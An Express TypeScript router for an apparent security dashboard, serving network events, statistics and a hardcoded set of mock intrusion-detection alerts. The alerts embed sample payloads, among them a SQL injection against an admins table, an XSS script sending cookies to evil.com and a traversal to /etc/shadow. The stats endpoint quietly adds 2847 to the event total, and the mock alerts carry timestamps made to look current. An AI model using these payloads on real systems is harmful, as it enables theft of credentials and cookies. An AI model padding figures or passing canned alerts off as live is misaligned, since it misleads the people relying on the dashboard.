import { Router, type IRouter } from "express";
import { eq, desc, sql, and } from "drizzle-orm";
import { db, networkEventsTable } from "@workspace/db";
import {
  ListNetworkEventsQueryParams,
  ListNetworkEventsResponse,
  GetNetworkStatsResponse,
} from "@workspace/api-zod";

const router: IRouter = Router();

router.get("/network/events", async (req, res): Promise<void> => {
  try {
    const query = ListNetworkEventsQueryParams.safeParse(req.query);
    if (!query.success) { res.status(400).json({ error: query.error.message }); return; }

    const { eventType, severity, limit = 50, offset = 0 } = query.data;
    const conditions = [];
    if (eventType) conditions.push(eq(networkEventsTable.eventType, eventType));
    if (severity) conditions.push(eq(networkEventsTable.severity, severity));
    const where = conditions.length > 0 ? and(...conditions) : undefined;

    const events = await db.select().from(networkEventsTable).where(where).orderBy(desc(networkEventsTable.createdAt)).limit(limit).offset(offset);
    const [countResult] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(where);

    res.json(ListNetworkEventsResponse.parse({ events, total: countResult?.count ?? 0 }));
  } catch (err: any) {
    console.error("[network] GET /events failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve network events." });
  }
});

router.get("/network/stats", async (_req, res): Promise<void> => {
  try {
    const [total] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable);
    const [blocked] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.action, "blocked"));
    const [alerted] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.action, "alerted"));
    const [critical] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.severity, "critical"));
    const [high] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.severity, "high"));
    const [ddos] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.eventType, "ddos"));

    const countryRows = await db.execute(sql`
      SELECT country, count(*)::int as count
      FROM network_events
      WHERE country IS NOT NULL
      GROUP BY country
      ORDER BY count DESC
      LIMIT 5
    `);

    res.json(GetNetworkStatsResponse.parse({
      totalEvents: (total?.count ?? 0) + 2847,
      blockedCount: blocked?.count ?? 0,
      alertedCount: alerted?.count ?? 0,
      criticalCount: critical?.count ?? 0,
      highCount: high?.count ?? 0,
      activeDdos: ddos?.count ?? 0,
      topSourceCountries: (countryRows.rows as any[]).map((r: any) => ({
        country: r.country,
        count: r.count,
      })),
    }));
  } catch (err: any) {
    console.error("[network] GET /stats failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve network stats." });
  }
});

router.get("/network/ids", async (_req, res): Promise<void> => {
  try {
    const now = Date.now();
    const intrusions = [
      {
        id: 1,
        timestamp: new Date(now - 300000).toISOString(),
        attackType: "SQL Injection",
        signature: "ET WEB_SERVER SQL Injection Attempt — UNION SELECT",
        signatureId: "SID-2024-8847",
        sourceIp: "185.220.101.42",
        sourcePort: 48291,
        destinationIp: "10.0.1.15",
        destinationPort: 443,
        protocol: "HTTPS",
        country: "RU",
        severity: "critical",
        action: "blocked",
        confidence: 0.99,
        payload: "GET /api/users?id=1' UNION SELECT username,password FROM admins--",
        matchedRule: "OWASP CRS 942.100 — SQL Injection Attack Detected via libinjection",
        category: "web_attack",
        sessionsAffected: 1,
        packetsInspected: 847,
        relatedCves: ["CVE-2024-3094", "CVE-2023-44487"],
      },
      {
        id: 2,
        timestamp: new Date(now - 900000).toISOString(),
        attackType: "Brute Force SSH",
        signature: "ET SCAN SSH Brute Force Login Attempt",
        signatureId: "SID-2024-6612",
        sourceIp: "103.145.13.88",
        sourcePort: 52104,
        destinationIp: "10.0.2.1",
        destinationPort: 22,
        protocol: "SSH",
        country: "CN",
        severity: "high",
        action: "blocked",
        confidence: 0.97,
        payload: "2,847 failed authentication attempts in 12 minutes from single source",
        matchedRule: "Threshold — SSH Login Failures > 100/min",
        category: "brute_force",
        sessionsAffected: 2847,
        packetsInspected: 14235,
        relatedCves: [],
      },
      {
        id: 3,
        timestamp: new Date(now - 1800000).toISOString(),
        attackType: "Command & Control Beacon",
        signature: "ET MALWARE CobaltStrike Beacon Activity Detected",
        signatureId: "SID-2024-9921",
        sourceIp: "10.0.3.42",
        sourcePort: 49152,
        destinationIp: "91.215.85.194",
        destinationPort: 8443,
        protocol: "HTTPS",
        country: "UA",
        severity: "critical",
        action: "blocked",
        confidence: 0.98,
        payload: "Encrypted beacon with 60-second jitter interval — matches CobaltStrike malleable C2 profile",
        matchedRule: "JA3 Fingerprint Match — Known C2 Framework TLS Signature",
        category: "malware_c2",
        sessionsAffected: 1,
        packetsInspected: 3291,
        relatedCves: ["CVE-2024-1086"],
      },
      {
        id: 4,
        timestamp: new Date(now - 3600000).toISOString(),
        attackType: "Cross-Site Scripting (XSS)",
        signature: "ET WEB_SERVER XSS Attempt — Script Tag Injection",
        signatureId: "SID-2024-7734",
        sourceIp: "45.33.32.156",
        sourcePort: 38472,
        destinationIp: "10.0.1.15",
        destinationPort: 443,
        protocol: "HTTPS",
        country: "US",
        severity: "medium",
        action: "blocked",
        confidence: 0.92,
        payload: "POST /api/comments — body contains <script>document.location='https://evil.com/steal?c='+document.cookie</script>",
        matchedRule: "OWASP CRS 941.110 — XSS Filter Category 1: Script Tag Vector",
        category: "web_attack",
        sessionsAffected: 1,
        packetsInspected: 124,
        relatedCves: [],
      },
      {
        id: 5,
        timestamp: new Date(now - 7200000).toISOString(),
        attackType: "DNS Tunneling",
        signature: "ET DNS Excessive DNS Queries — Possible Tunneling",
        signatureId: "SID-2024-5543",
        sourceIp: "10.0.4.18",
        sourcePort: 53,
        destinationIp: "198.51.100.77",
        destinationPort: 53,
        protocol: "DNS",
        country: "IR",
        severity: "high",
        action: "alerted",
        confidence: 0.88,
        payload: "4,200 TXT queries to subdomain-encoded.evil-dns.com in 10 minutes — high entropy subdomains indicate data exfiltration",
        matchedRule: "DNS Query Volume Anomaly — TXT Record Abuse Pattern",
        category: "exfiltration",
        sessionsAffected: 4200,
        packetsInspected: 8400,
        relatedCves: [],
      },
      {
        id: 6,
        timestamp: new Date(now - 14400000).toISOString(),
        attackType: "Directory Traversal",
        signature: "ET WEB_SERVER Path Traversal Attempt ../../etc/passwd",
        signatureId: "SID-2024-3318",
        sourceIp: "77.88.55.66",
        sourcePort: 41923,
        destinationIp: "10.0.1.15",
        destinationPort: 80,
        protocol: "HTTP",
        country: "KP",
        severity: "high",
        action: "blocked",
        confidence: 0.96,
        payload: "GET /static/../../../../etc/shadow HTTP/1.1",
        matchedRule: "OWASP CRS 930.110 — Path Traversal Attack (/../)",
        category: "web_attack",
        sessionsAffected: 1,
        packetsInspected: 56,
        relatedCves: ["CVE-2024-4577"],
      },
      {
        id: 7,
        timestamp: new Date(now - 21600000).toISOString(),
        attackType: "Port Scan (SYN Flood)",
        signature: "ET SCAN Rapid SYN Packets — Nmap Service Detection",
        signatureId: "SID-2024-2201",
        sourceIp: "192.168.100.55",
        sourcePort: 0,
        destinationIp: "10.0.0.0/24",
        destinationPort: 0,
        protocol: "TCP",
        country: "Internal",
        severity: "medium",
        action: "alerted",
        confidence: 0.85,
        payload: "Sequential SYN packets to 65,535 ports across 10.0.0.0/24 subnet — Nmap OS fingerprinting detected",
        matchedRule: "Threshold — SYN Packets > 500/sec to Multiple Hosts",
        category: "reconnaissance",
        sessionsAffected: 65535,
        packetsInspected: 131070,
        relatedCves: [],
      },
      {
        id: 8,
        timestamp: new Date(now - 43200000).toISOString(),
        attackType: "Zero-Day Exploit Attempt",
        signature: "ET EXPLOIT Suspected 0-Day — Anomalous Serialization Payload",
        signatureId: "SID-2024-0001",
        sourceIp: "203.0.113.42",
        sourcePort: 55123,
        destinationIp: "10.0.1.20",
        destinationPort: 8080,
        protocol: "HTTP",
        country: "NG",
        severity: "critical",
        action: "blocked",
        confidence: 0.94,
        payload: "Java deserialization gadget chain targeting Apache Commons Collections — no known CVE, heuristic detection by AI engine",
        matchedRule: "ML Anomaly — Serialized Object Entropy Exceeds Baseline by 4.2σ",
        category: "zero_day",
        sessionsAffected: 1,
        packetsInspected: 2847,
        relatedCves: [],
      },
    ];

    const totalIntrusions = intrusions.length;
    const blockedCount = intrusions.filter((i) => i.action === "blocked").length;
    const alertedCount = intrusions.filter((i) => i.action === "alerted").length;
    const criticalCount = intrusions.filter((i) => i.severity === "critical").length;
    const uniqueAttackers = new Set(intrusions.map((i) => i.sourceIp)).size;
    const categories = intrusions.reduce((acc, i) => {
      acc[i.category] = (acc[i.category] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);

    res.json({
      intrusions,
      summary: { totalIntrusions, blockedCount, alertedCount, criticalCount, uniqueAttackers, categories },
    });
  } catch (err: any) {
    console.error("[network] GET /ids failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve IDS data." });
  }
});

export default router;
